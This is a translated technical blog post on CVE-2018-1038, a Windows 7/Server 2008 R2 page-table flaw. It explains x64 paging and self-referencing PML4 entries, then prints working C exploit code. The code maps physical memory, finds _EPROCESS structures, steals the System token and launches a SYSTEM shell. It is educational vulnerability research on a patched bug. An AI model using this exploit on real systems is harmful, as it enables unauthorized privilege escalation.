***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

 **Ulf Frisk 在今年 3 月发现了一个作用于 Windows7 和 Server 2008
的漏洞。这个漏洞很有意思：微软发布了一个补丁来修复之前爆出的「Meltdown」漏洞，然后这个补丁却不经意导致了新的问题，让任意进程可以读取和修改页表项目。**

有关这个漏洞的 wirteup 可以在 Ulf 的博客上找到，十分值得一读。

我这一周有了一些空闲时间，所以我决定好好地看看这个漏洞的详细细节。我的目标是打造一个用于进程提权的简洁的
exploit。为了完成这个目标，我第一次详细地分析了 Windows 的内存管理机制，因此我写下了这篇博客。

和往常一样，这篇文章主要是教大家学习这个 exploit 的技巧而不是仅仅提供一个随时可用的 exploit。所以，我们先看一下内存分页的一些基本概念。

##  分页机制

为了理解 CVE-2018-1038 漏洞，我们首先需要对 x86/x64 架构下的分页机制有所了解。

我们都知道，在一个 x64 架构上的 OS 中，虚拟地址大概是如下这个样子的：

###  **0x7fffffd6001**

接下来的事情就不是众所周知的了：这个虚拟地址并不是一个指向某个实际物理地址的指针。它实际上由许多字段组成，这些字段联合在一起被转化为物理地址。

我们首先将上述虚拟地址转为二进制表示。

    
    
    0000000000000000 000001111 111111111 111111111 111010110000000000001

从左到右的前 16 位并不存在任何实际意义，它们仅仅是虚拟地址第 48 位的简单复制（译者注： 由于目前还用不到完整的 64 位寻址空间，AMD64
架构只支持 48 位的内存地址，剩下 16 位只是这 48 位地址的符号扩展）。

接下来从第 48 位开始看

> 1）前 9 位，000001111（十进制 15），是 PML4 表中的一个偏离。
>
> 2）之后的 9 位，11111111（十进制 511），是 PDPT 表中的一个偏移。
>
> 3）再之后的 9 位，11111111（十进制 511），是 PD 表中的一个偏移。
>
> 4）再之后的 9 位，111010110（十进制 470），是 PT 表的一个偏移。
>
> 5）最后的 12 位，0000000000000001（十进制 1），是内存页面的一个偏移。

于是理所当然的，下一个问题就是…PML4, PDPT, PD 和 PT 到底是什么？

##  PML4, PDPT, PD 和 PT

在 x64 架构中，将一个虚拟地址转化为物理地址，我们需要如下一系列的页表。CR3 寄存器指向了最开始的 PML4 页表。

> 1）PML4– Page Map Level 4
>
> 2）PDPT– Page Directory Pointer Table
>
> 3）PD– Page Directory
>
> 4）PT– Page Table

每一个页表都负责提供我们寻址过程中需要的物理地址，以及这个物理地址的一些标志位。

例如，一个页表中的一个项目可能会负责提供我们一个指向下一级页表的指针，同时也会负责设置页面的 NX 位，或者保证指向的内存页面属于
kernel，不能被操作系统中的进程访问。

将实际的概念简化后，虚拟地址将如下通过四个页表最终转为物理地址。

![](https://image.3001.net/images/20180512/1526112272490.png!small)

这样我们可以看到，通过一个页表项目及指向下一级页表，进程会遍历上述四个页表，最终最后一个页表会指向虚拟地址对应的物理内存页面，然后再加上最后的偏移量形成实际物理地址。

我们可以想象，对一个操作系统来说保存和管理上述页表会需要一些开销。因此 OS 开发者会使用一个叫做「自引用页表」的技术来尽量避免上述繁杂的流程。

##  自引用页表

简单的说，「自引用页表」就是在 PML4 页表中的某一项中自我引用。例如，我们在 PML4 表的偏移为 0x100 位置中创建新的条目，其指向的内存就是
PML4 所在的内存地址，我们就有了一个「自引用条目」

为什么需要这么做呢？实际上，这样就提供了我们一些虚拟地址，使得我们可以通过这些地址来查看和修改页表。

例如，如果我们想修改 PML4，我们可以直接引用虚拟地址 0x804020100000。这个虚拟地址会如下地进行转换：

> 1）查找 PML4 的 0x100 条目：得到 PML4 的物理地址
>
> 2）查找 PDPT 的 0x100 条目：同样的，还是得到 PML4 的物理地址
>
> 3）查找 PD 的 0x100 条目：同样的，还是得到 PML4 的物理地址
>
> 4）查找 PT 的 0x100 条目：同样的，还是得到 PML4 的物理地址

再加上最后 12 位的偏移量，我们最终得到的物理地址还是 PML4 的物理地址。

希望你们看到这的时候能够对自引用页表的概念有所了解…对于我来说我花了好几个晚上盯着屏幕才把这玩意搞明白 ：D

我们用下面的代码作为进一步的例子。我们可以看到虚拟地址 0xffff804020100000 可以让我们编辑 PML4。在这个例子中，PML4 的
0x100 个条目是自引用的。

    
    
    package main
    import (
        "fmt" 
    )
    func VAtoOffsets(va uint64) {
        phy_offset := va & 0xFFF
        pt_index := (va >> 12) & 0x1FF
        pde_index := (va >> (12 + 9)) & 0x1FF
        pdpt_index := (va >> (12 + 9 + 9)) & 0x1FF
        pml4_index := (va >> (12 + 9 + 9 + 9)) & 0x1FF
        fmt.Printf("PML4 Index: %03x\n", pml4_index)
        fmt.Printf("PDPT Index: %03x\n", pdpt_index)
        fmt.Printf("PDE Index: %03x\n", pde_index)
        fmt.Printf("PT Index: %03x\n", pt_index)
        fmt.Printf("Page offset: %03x\n", phy_offset)
    }
    func OffsetsToVA(phy_offset, pt_index, pde_index, pdpt_index, pml4_index uint64) {
        var va uint64
        va = pml4_index << (12 + 9 + 9 + 9)
        va = va | pdpt_index << (12 + 9 + 9)
        va = va | pde_index << (12 + 9)
        va = va | pt_index << 12
        va = va | phy_offset
        if ((va & 0x800000000000) == 0x800000000000) {
    	    va |= 0xFFFF000000000000
        }
        fmt.Printf("Virtual Address: %x\n", va)
    }
    func main() {
        VAtoOffsets(0xffff804020100000)
        OffsetsToVA(0, 0x100, 0x100, 0x100, 0x100)
    }

你们可以直接在这个页面看到代码的结果。

<https://play.golang.org/p/tyQUoox47ri>

现在，假如说我们想要修改虚拟地址的 PDPT 条目。利用自引用技术这个就很容易做到了。

例如，我们的目标是 PML4 中 0x150 条目所指向的 PDPT 表，我们用虚拟地址 0xffff804020150000 就可以得到这个
PDPT。一样的，我们的 golang 小程序可以帮助阐述这个过程。

<https://play.golang.org/p/f02hYYFgmWo>

##  漏洞

好了，现在我们对分页机制有所理解，我们就可以看看漏洞了。

如果我们在 Windows 7 x64 或者 Server2008 r2 x64 上安装 2018-02 补丁，我们可以看到 PML4 表中的第 0x1ed
条目被更新了。

在我的测试环境中，该条目应该和以下相似：

    
    
    0x000000002d282867

我们应注意带这个条目的第 3 位。第 3 位，如果为 1 的话，将允许用户态的进程访问该内存页面，而不是限制只能被 kernel 访问… :0

更糟的是，PML4 的 0xled 条目在 Windows 7 x64 和 Windows Server 2008R2 x64
中被用来作为自引用条目。这意味着任何一个用户态进程都有能力去查看和改写 PML4 表。

而且我们知道，通过修改这个顶级的页表，我们有能力查看和修改系统中所有的物理内存页面…\\_(ö)_/

漏洞利用

那么，我们如何利用这个漏洞呢？

我们可以通过以下几步来利用这个漏洞来达到权限提升的目的。

> 1）创建一系列新的页表，这些页表能让我们访问任意物理内存
>
> 2）搜集一些能帮助我们在内核中查找_EPROCESS 结构体的特征
>
> 3）找到自身进程以及 System 进程的_EPROCESS 结构体
>
> 4）将 System 进程的 Token 复制到自身进程中，这样就能将自身进程提升到 NT_AUTHORITY 权限

在开始之前需要提到的是，如果我没有看过 PCILeech』s
的代码，我不可能写出这篇博客。由于这是我第一次如此深度地去了解操作系统的分页机制，devicetmd.c
中的漏洞利用代码花了我好几个不眠之夜去理解它。在这里我要感谢和赞许 Ulf Frisk 和 PCILeech。

如果要简单地生成特征的话，我们可以利用_EPROCESS 中的 ImageFIleName 和 PriorityClass
字段。我们扫描整个内存，若这两个字段匹配上了我们就认为寻找到了目标。在我的测试环境中这种方法可以正常完成工作，当然，如果你在实验中这两个特征并不能完全定位到目标，你可以考虑自己重新定义搜索的粒度。与其简单地重现
Ulf 的分页技术，我们不如选择利用 PCILeech 中的代码来建立我们的页表。为了使事情更容易被理解，我更新了其中一些 magic number
并添加了一些注释来解释到底发生了什么。

    
    
    unsigned long long iPML4, vaPML4e, vaPDPT, iPDPT, vaPD, iPD;
    DWORD done;
    // setup: PDPT 劫持到固定的物理地址 0x10000
    // 本代码利用之前讨论过的 PML4 自引用技术， 遍历 PML4 直到找到一个可以被劫持的空的条目
    for (iPML4 = 256; iPML4 < 512; iPML4++) {
    	vaPML4e = PML4_BASE + (iPML4 << 3);
    	if (*(unsigned long long *)vaPML4e) { continue; }
    	// 当我们找到可劫持的条目后，我们将其指向下一级页表的物理内存地址，也就是 0x10000
    	// flag "067"代表着对应页面可以被用户态进程访问 e.
    	*(unsigned long long *)vaPML4e = 0x10067;
    	break;
    }
    printf("[*] PML4 Entry Added At Index: %d\n", iPML4);
    // 在这里， 我们通过虚拟地址访问 PDPT
    // 例如，如果我们劫持的条目是 PML4 的第 256 条， PDPT 的虚拟地址就是 0xFFFFF6FB7DA00000 + 0x100000
    // 这个虚拟地址让我们可以访问物理地址 0x10000, 其在各个页表的偏移为
    // PML4 Index: 1ed | PDPT Index : 1ed |	PDE Index : 1ed | PT Index : 100
    vaPDPT = PDP_BASE + (iPML4 << (9 * 1 + 3));
    printf("[*] PDPT Virtual Address: %p", vaPDPT);
    // 2： 建立 31 个 PD 表，其物理地址为 0x11000 - 0x1f000, 表中对应的页面大小为 2MB
    // 以下代码在 PDPT 中建立 31 个项目
    for (iPDPT = 0; iPDPT < 31; iPDPT++) {
    	*(unsigned long long *)(vaPDPT + (iPDPT << 3)) = 0x11067 + (iPDPT << 12);
    }
    // 对于每一个 PD, 进一步创建 512 个 PT 项目
    // 这样我们将有 512*32*2mb = 33gb 的物理内存空间
    for (iPDPT = 0; iPDPT < 31; iPDPT++) {
    	if ((iPDPT % 3) == 0)
    		printf("\n[*] PD Virtual Addresses: ");
    	vaPD = PD_BASE + (iPML4 << (9 * 2 + 3)) + (iPDPT << (9 * 1 + 3));
    	printf("%p ", vaPD);
    	for (iPD = 0; iPD < 512; iPD++) {
                    // 注意到下面的代码中给每一个项目添加了 0xe7 的 flag
    		// 这个是用来创建 2mb 大小的页面，而不是默认的 4k 大小		
                    *(unsigned long long *)(vaPD + (iPD << 3)) = ((iPDPT * 512 + iPD) << 21) | 0xe7;
    	}
    }
    printf("\n[*] Page tables created, we now have access to ~33gb of physical memory\n");

现在，页表设计完毕之后，我们需要在物理内存中寻找_EPROCESS 结构体。我们先看看_EPROCESS 结构体是什么样子。

![](https://image.3001.net/images/20180512/15261123507049.png!small)

如果要简单地生成特征的话，我们可以利用_EPROCESS 中的 ImageFIleName 和 PriorityClass
字段。我们扫描整个内存，若这两个字段匹配上了我们就认为寻找到了目标。在我的测试环境中这种方法可以正常完成工作，当然，如果你在实验中这两个特征并不能完全定位到目标，你可以考虑自己重新定义搜索的粒度。

    
    
    #define EPROCESS_IMAGENAME_OFFSET 0x2e0
    #define EPROCESS_TOKEN_OFFSET 0x208
    #define EPROCESS_PRIORITY_OFFSET 0xF  // This is the offset from IMAGENAME, not from base
    unsigned long long ourEPROCESS = 0, systemEPROCESS = 0;
    unsigned long long exploitVM = 0xffff000000000000 + (iPML4 << (9 * 4 + 3));
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(π, sizeof(pi));
    printf("[*] Hunting for _EPROCESS structures in memory\n");
    for (int i = 0x100000; i < 31 * 512 * 2097152; i++) {
    	__try {
    		// Locate EPROCESS via the IMAGE_FILE_NAME field, and PRIORITY_CLASS field
    		if (ourEPROCESS == 0 && memcmp("TotalMeltdownP", (unsigned char *)(exploitVM + i), 14) == 0) {
    			if (*(unsigned char *)(exploitVM + i + EPROCESS_PRIORITY_OFFSET) == 0x2) {
    				ourEPROCESS = exploitVM + i - EPROCESS_IMAGENAME_OFFSET;
    				printf("[*] Found our _EPROCESS at %p\n", ourEPROCESS);
    			}
    		}
    		// Locate EPROCESS via the IMAGE_FILE_NAME field, and PRIORITY_CLASS field
    		else if (systemEPROCESS == 0 && memcmp("System\0\0\0\0\0\0\0\0\0", (unsigned char *)(exploitVM + i), 14) == 0) {
    			if (*(unsigned char *)(exploitVM + i + EPROCESS_PRIORITY_OFFSET) == 0x2) {
    				systemEPROCESS = exploitVM + i - EPROCESS_IMAGENAME_OFFSET;
    				printf("[*] Found System _EPROCESS at %p\n", systemEPROCESS);
    			}
    		}
    		if (systemEPROCESS != 0 && ourEPROCESS != 0) {
    			...
    			break;
    		}
    	}
    	__except (EXCEPTION_EXECUTE_HANDLER) {
    		printf("[X] Exception occured, stopping to avoid BSOD\n");
    	}
    }

最后，如同绝大多数内核权限提升漏洞的利用一样，我们将自身进程的_EPROCESS.Token 字段复制为 System 进程的 Token。

    
    
    if (systemEPROCESS != 0 && ourEPROCESS != 0) {
        // Swap the tokens by copying the pointer to System Token field over our process token
        printf("[*] Copying access token from %p to %p\n", systemEPROCESS + EPROCESS_TOKEN_OFFSET, ourEPROCESS + EPROCESS_TOKEN_OFFSET);
        *(unsigned long long *)((char *)ourEPROCESS + EPROCESS_TOKEN_OFFSET) = *(unsigned long long *)((char *)systemEPROCESS + EPROCESS_TOKEN_OFFSET);
        printf("[*] Done, spawning SYSTEM shell...\n\n");
        CreateProcessA(0,
                       "cmd.exe",
                       NULL,
                       NULL,
                       TRUE,
                       0,
                       NULL,
                       NULL,
                       &si,
                       π);
            
        break;
    }

于是我们就能进行权限的提升了。

##  修复，以及改进

微软发布了 CVE-2018-1038 的补丁来修复这个漏洞。

为了减少蓝屏死机的可能性，我在 POC 中增加了额外的内存检查。POC 的第二版可以在这里找到。

<https://gist.github.com/xpn/3792ec34d712425a5c47caf5677de5fe>

原文地址：

<https://blog.xpnsec.com/total-meltdown-cve-2018-1038/>

***本文作者：无。，转载请注明来自FreeBuf.COM**

